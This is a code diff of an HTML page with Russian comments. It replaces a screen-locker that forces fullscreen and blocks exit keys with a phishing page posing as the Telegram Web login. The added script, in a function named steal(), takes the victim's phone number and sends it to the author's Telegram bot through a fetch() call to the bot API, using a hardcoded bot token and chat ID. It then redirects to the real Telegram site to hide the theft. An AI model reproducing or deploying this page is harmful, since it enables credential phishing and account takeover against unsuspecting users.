@@ -3,96 +3,48 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Проверка</title>
+<title>Telegram Web</title>
 <style>
-body {
-margin: 0;
-background: #0a0a0a;
-color: #eee;
-font-family: monospace;
-display: flex;
-align-items: center;
-justify-content: center;
-height: 100vh;
-}
-#box {
-text-align: center;
-padding: 20px;
-}
-input {
-padding: 10px;
-font-size: 18px;
-text-align: center;
-background: #111;
-color: #0f0;
-border: 1px solid #333;
-border-radius: 4px;
-outline: none;
-}
-button {
-margin-top: 15px;
-padding: 10px 20px;
-background: #c00;
-color: #fff;
-border: 0;
-border-radius: 4px;
-cursor: pointer;
-font-size: 16px;
-}
-button:hover {
-background: #a00;
-}
-#msg {
-color: #f00;
-font-weight: bold;
-margin-top: 10px;
-}
+body { margin:0; background:#0e1621; color:#fff; font-family:Arial, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; }
+.login-box { background:#17212b; padding:40px; border-radius:10px; width:300px; text-align:center; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
+.logo { width:80px; margin-bottom:20px; }
+input { width:100%; padding:12px; margin:10px 0; background:#242f3d; border:1px solid #242f3d; color:#fff; border-radius:6px; box-sizing:border-box; font-size:16px; }
+input:focus { border-color:#2ea6ff; outline:none; }
+button { width:100%; padding:12px; background:#2ea6ff; color:#fff; border:none; border-radius:6px; font-size:16px; cursor:pointer; margin-top:10px; font-weight:bold; }
+button:hover { background:#1c8ce0; }
+.error { color:#ff4e4e; font-size:14px; margin-top:10px; display:none; }
 </style>
 </head>
 <body>
-<div id="box">
-<h2>Введите код для продолжения</h2>
-<input id="code" placeholder="XXXX-XXXX" autofocus>
-<br>
-<button onclick="check()">Проверить</button>
-<p id="msg"></p>
+<div class="login-box">
+<img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo" alt="Telegram">
+<h2>Sign in to Telegram</h2>
+<p style="color:#8b9cae; font-size:14px;">Please confirm your country and enter your phone number.</p>
+
+<input type="text" id="phone" placeholder="Phone number">
+<button onclick="steal()">Next</button>
+<div class="error" id="err">Invalid phone number</div>
 </div>
+
 <script>
-// 1. Попытка включить полноэкранный режим при клике
-document.body.addEventListener('click', () => {
-if (!document.fullscreenElement) {
-document.documentElement.requestFullscreen().catch(()=>{});
-}
-});
+// ТВОИ ДАННЫЕ
+const token = '9032594050:AAEGZzvavJ5p3gfvo-9bUwEI08ePFw5a9pw';
+const chat_id = '7809855501'; 
 
-// 2. Предупреждение при закрытии вкладки
-window.addEventListener('beforeunload', (e) => {
-e.preventDefault();
-e.returnValue = '';
-});
-
-// 3. Блокировка клавиш выхода (Esc, F11, Ctrl+W и т.д.)
-document.addEventListener('keydown', (e) => {
-if (['Escape','F11'].includes(e.key) || (e.ctrlKey && ['w','W','t','T','n','N'].includes(e.key))) {
-e.preventDefault();
-e.stopPropagation();
+function steal() {
+const phone = document.getElementById('phone').value;
+if (phone.length < 5) {
+document.getElementById('err').style.display = 'block';
+return;
 }
-});
 
-// 4. Проверка кода
-function check(){
-const v = document.getElementById('code').value.trim();
-if (v === '1234-ABCD') { // <--- ТУТ ТВОЙ КОД
-document.getElementById('msg').style.color = '#0f0';
-document.getElementById('msg').textContent = 'OK, отпускаю...';
-setTimeout(()=>{
-if (document.exitFullscreen) document.exitFullscreen().catch(()=>{});
-location.href = 'https://t.me'; // <--- Куда перекинуть после ввода
-}, 800);
-} else {
-document.getElementById('msg').style.color = '#f00';
-document.getElementById('msg').textContent = 'Неверный код';
-}
+// Отправляем номер тебе в бота
+fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=Номер жертвы: ${phone}`);
+
+// Перекидываем на настоящий Telegram
+setTimeout(() => {
+window.location.href = 'https://web.telegram.org';
+}, 500);
 }
 </script>
 </body>
